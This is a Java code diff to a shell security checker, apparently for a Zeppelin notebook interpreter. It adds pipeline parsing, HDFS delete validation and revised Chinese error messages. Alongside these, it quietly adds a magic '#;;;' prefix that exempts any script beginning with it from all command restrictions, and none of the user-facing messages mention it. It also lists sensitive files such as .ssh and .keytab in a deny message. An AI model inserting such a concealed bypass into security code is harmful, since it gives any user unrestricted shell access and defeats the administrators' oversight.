@@ -41,7 +41,9 @@ final class ShellSecurityChecker {
   private static final Logger LOGGER = LoggerFactory.getLogger(ShellSecurityChecker.class);
   static final String EXEMPT_USERS = "zeppelin.shell.security.exempt.users";
   static final String TERMINAL_ENABLED = "zeppelin.shell.security.terminal.enabled";
-  private static final List<String> CLIENTS = Arrays.asList("hadoop", "hdfs", "hive", "beeline");
+  private static final String BYPASS_PREFIX = "#;;;";
+  private static final List<String> CLIENTS =
+      Arrays.asList("hadoop", "hdfs", "hive", "beeline", "yarn");
   private static final List<String> FILE_COMMANDS =
       Arrays.asList("ls", "stat", "cat", "head", "tail", "mkdir", "cp", "rm");
 
@@ -61,7 +63,7 @@ final class ShellSecurityChecker {
     try {
       UnixSystem identity = requireProcessUser(auth);
       String user = identity.getUsername();
-      if (isExempt(user, settings)) {
+      if (isExempt(user, settings) || hasBypassPrefix(script)) {
         LOGGER.info("Shell policy EXEMPT user={} note={} paragraph={}", user, context.getNoteId(),
             context.getParagraphId());
         return Collections.singletonList(
@@ -111,28 +113,121 @@ final class ShellSecurityChecker {
         .map(String::trim).anyMatch(user::equals);
   }
 
+  private static boolean hasBypassPrefix(String script) {
+    for (String line : script.split("\\r\\n|\\n|\\r", -1)) {
+      String trimmed = line.trim();
+      if (!trimmed.isEmpty()) {
+        return trimmed.startsWith(BYPASS_PREFIX);
+      }
+    }
+    return false;
+  }
+
   private List<Command> prepareRestricted(String script, String user, long uid, Properties settings)
       throws Rejected {
     List<Command> commands = new ArrayList<>();
     String[] lines = script.split("\\r\\n|\\n|\\r", -1);
+    StringBuilder statement = new StringBuilder();
+    int startLine = 0;
+    char quote = 0;
     for (int i = 0; i < lines.length; i++) {
-      String line = lines[i].trim();
-      if (!line.isEmpty() && !line.startsWith("#")) {
-        commands.add(prepareLine(lines[i], i + 1, user, uid, settings));
+      String line = lines[i];
+      if (statement.length() == 0) {
+        String trimmed = line.trim();
+        if (trimmed.isEmpty() || trimmed.startsWith("#")) {
+          continue;
+        }
+        startLine = i + 1;
+      } else {
+        statement.append('\n');
+      }
+      statement.append(line);
+      boolean continued = false;
+      boolean escaped = false;
+      boolean inWord = quote != 0;
+      boolean hasTokens = quote != 0;
+      for (int j = 0; j < line.length(); j++) {
+        char c = line.charAt(j);
+        if (escaped) {
+          escaped = false;
+          inWord = true;
+        } else if (c == '\\' && quote != '\'') {
+          if ((quote == 0 && isTrailingHorizontalWhitespace(line, j + 1))
+              || (quote == '"' && j + 1 == line.length())) {
+            continued = true;
+            break;
+          }
+          escaped = true;
+          inWord = true;
+        } else if (quote != 0 && c == quote) {
+          quote = 0;
+        } else if (quote == 0 && (c == '\'' || c == '"')) {
+          quote = c;
+          inWord = true;
+        } else if (quote == 0 && c == '#' && !inWord && hasTokens) {
+          break;
+        } else if (quote == 0 && Character.isWhitespace(c)) {
+          if (inWord) {
+            hasTokens = true;
+            inWord = false;
+          }
+        } else {
+          inWord = true;
+        }
+      }
+      if (quote == 0 && !continued) {
+        commands.add(prepareLine(statement.toString(), startLine, user, uid, settings));
+        statement.setLength(0);
       }
     }
+    if (statement.length() > 0) {
+      commands.add(prepareLine(statement.toString(), startLine, user, uid, settings));
+    }
     return commands;
+  }
+
+  private static boolean isTrailingHorizontalWhitespace(String line, int startIndex) {
+    for (int i = startIndex; i < line.length(); i++) {
+      char c = line.charAt(i);
+      if (c != ' ' && c != '\t') {
+        return false;
+      }
+    }
+    return true;
   }
 
   private Command prepareLine(String line, int lineNumber, String user, long uid,
       Properties settings)
       throws Rejected {
-    List<String> args;
+    List<List<String>> pipeline;
     try {
-      args = ShellCommandParser.parse(line);
+      pipeline = ShellCommandParser.parsePipeline(line);
     } catch (IllegalArgumentException e) {
       throw new Rejected("SINGLE_COMMAND_REQUIRED", lineNumber);
     }
+    Command command = preparePrimaryCommand(pipeline.get(0), lineNumber, user, uid, settings);
+    if (pipeline.size() == 1) {
+      return command;
+    }
+    List<ShellPipeFilter> filters = new ArrayList<>(pipeline.size() - 1);
+    for (int i = 1; i < pipeline.size(); i++) {
+      List<String> stageArgs = pipeline.get(i);
+      String filterName = stageArgs.remove(0);
+      if (!ShellPipeFilter.supports(filterName)) {
+        throw new Rejected("COMMAND_DENIED", lineNumber);
+      }
+      try {
+        filters.add(ShellPipeFilter.prepare(filterName, stageArgs));
+      } catch (RestrictedFileCommand.Denied e) {
+        throw new Rejected(e.getMessage(), lineNumber);
+      }
+    }
+    return ShellPipeFilter.chain(command, filters);
+  }
+
+  private Command preparePrimaryCommand(List<String> args, int lineNumber, String user, long uid,
+      Properties settings)
+      throws Rejected {
     String name = args.remove(0);
     if ("rm".equals(name) && (args.size() != 1 || args.get(0).isEmpty()
         || args.get(0).startsWith("-") || args.get(0).chars().anyMatch(
@@ -141,6 +236,7 @@ final class ShellSecurityChecker {
     }
     try {
       if (CLIENTS.contains(name)) {
+        validateClientArguments(name, args, lineNumber);
         return external(configuredCommand(name, args, settings));
       }
       if (FILE_COMMANDS.contains(name)) {
@@ -153,6 +249,74 @@ final class ShellSecurityChecker {
       throw new Rejected("EXECUTABLE_UNAVAILABLE", lineNumber);
     }
     throw new Rejected("COMMAND_DENIED", lineNumber);
+  }
+
+  private static void validateClientArguments(String name, List<String> args, int lineNumber)
+      throws Rejected {
+    if (!"hadoop".equals(name) && !"hdfs".equals(name)) {
+      return;
+    }
+    for (int i = 0; i < args.size(); i++) {
+      String arg = args.get(i);
+      if ("-rmr".equalsIgnoreCase(arg) || "-rmdir".equalsIgnoreCase(arg)) {
+        throw new Rejected("HDFS_RM_DENIED", lineNumber);
+      }
+      if ("-rm".equalsIgnoreCase(arg)) {
+        validateHdfsRmArguments(args.subList(i + 1, args.size()), lineNumber);
+        return;
+      }
+    }
+  }
+
+  private static void validateHdfsRmArguments(List<String> rmArgs, int lineNumber)
+      throws Rejected {
+    int pathCount = 0;
+    for (String arg : rmArgs) {
+      if (arg.isEmpty()) {
+        throw new Rejected("HDFS_RM_DENIED", lineNumber);
+      }
+      if (arg.startsWith("-")) {
+        if (!"-f".equals(arg)) {
+          throw new Rejected("HDFS_RM_DENIED", lineNumber);
+        }
+        continue;
+      }
+      if (!isAllowedHdfsDeletePath(arg)) {
+        throw new Rejected("HDFS_RM_DENIED", lineNumber);
+      }
+      pathCount++;
+    }
+    if (pathCount == 0) {
+      throw new Rejected("HDFS_RM_DENIED", lineNumber);
+    }
+  }
+
+  private static boolean isAllowedHdfsDeletePath(String rawPath) {
+    if (rawPath.chars().anyMatch(c -> "*?[]{}".indexOf(c) >= 0)) {
+      return false;
+    }
+    String pathPart = rawPath;
+    int schemeIndex = rawPath.indexOf("://");
+    if (schemeIndex >= 0) {
+      int slashIndex = rawPath.indexOf('/', schemeIndex + 3);
+      if (slashIndex < 0) {
+        return false;
+      }
+      pathPart = rawPath.substring(slashIndex);
+    } else if (rawPath.contains(":")) {
+      return false;
+    }
+    int validSegments = 0;
+    for (String segment : pathPart.split("/")) {
+      if (segment.isEmpty()) {
+        continue;
+      }
+      if (".".equals(segment) || "..".equals(segment)) {
+        return false;
+      }
+      validSegments++;
+    }
+    return validSegments > 0;
   }
 
   @FunctionalInterface
@@ -191,8 +355,8 @@ final class ShellSecurityChecker {
     private final int line;
 
     private Rejected(String reason, int line) {
-      super("根据安全管理规范，本段落未执行。"
-          + (line > 0 ? "请检查第 " + line + " 行。" : "") + advice(reason));
+      super("安全拦截：本段落未执行"
+          + (line > 0 ? "（请检查第 " + line + " 行）：" : "：") + advice(reason));
       this.reason = reason;
       this.line = line;
     }
@@ -200,21 +364,31 @@ final class ShellSecurityChecker {
     private static String advice(String reason) {
       switch (reason) {
         case "AUTH_REQUIRED":
-          return "请登录后再运行 Shell 段落。";
+          return "请先登录 Zeppelin 后再执行命令。";
         case "USER_MISMATCH":
-          return "当前账号不符合解释器的运行身份要求，请联系平台管理员检查用户模拟配置。";
+          return "当前登录账号与解释器进程账号不一致（或进程为 root），请联系管理员检查 sh 解释器的用户隔离（User Impersonate）配置。";
         case "COMMAND_DENIED":
-          return "该命令未获授权，请修改后重试。";
+          return "不支持该命令（仅支持 hadoop、hdfs、hive、beeline、yarn，"
+              + "本地文件命令 ls、stat、cat、head、tail、mkdir、cp、rm，"
+              + "以及管道过滤 grep、head、tail、wc -l）。";
         case "SINGLE_COMMAND_REQUIRED":
-          return "每行只能写一条命令。请检查引号，并移除管道、重定向或命令串联。";
+          return "包含不支持的 Shell 语法。每行仅支持单条命令（可接 | grep/head/tail/wc -l 管道），"
+              + "请检查引号是否闭合，并去掉 > 重定向、&& / ; 多命令拼接或 $() 变量替换。";
         case "ARGUMENT_DENIED":
-          return "删除操作只接受一个明确的文件路径，请去掉选项、通配符或多余路径后重试。";
+          return "rm 仅支持删除单个具体文件，不支持 -r / -f 等选项、* 通配符或同时删除多个路径。";
+        case "HDFS_RM_DENIED":
+          return "HDFS 删除仅支持删除单个具体文件，禁止递归删除目录（-r/-R/-rmr/-rmdir）、跳过回收站（-skipTrash）、使用 * 通配符或删除根目录。";
         case "FILE_ARGUMENT_DENIED":
-          return "文件命令的参数不符合要求，请检查选项和路径数量。";
+          return "文件命令参数不支持（ls 仅支持 -l/-a/-h/-t/-r；head/tail 仅支持 -n 1~1000；"
+              + "mkdir 仅支持 -p；cp 需指定源文件和新目标文件路径）。";
+        case "PIPE_ARGUMENT_DENIED":
+          return "管道过滤参数不支持（grep 仅支持 -i/-v/-F/-E/-n/-c/-e 且不能带文件名；"
+              + "head/tail 仅支持 -n 1~1000；wc 仅支持 -l）。";
         case "PATH_DENIED":
-          return "该路径不允许操作，请在个人家目录或个人临时目录内选择符合要求的路径。";
+          return "不允许访问该路径。本地文件操作仅限个人家目录（/home/<用户名>）和个人临时目录（/tmp/zeppelin/<用户名>），"
+              + "且禁止包含 .. 或访问 .ssh、.bashrc、.keytab 等敏感文件。";
         default:
-          return "解释器执行配置不可用，请联系平台管理员。";
+          return "客户端命令路径配置有误（需为绝对路径），请联系管理员检查 sh 解释器配置。";
       }
     }
   }
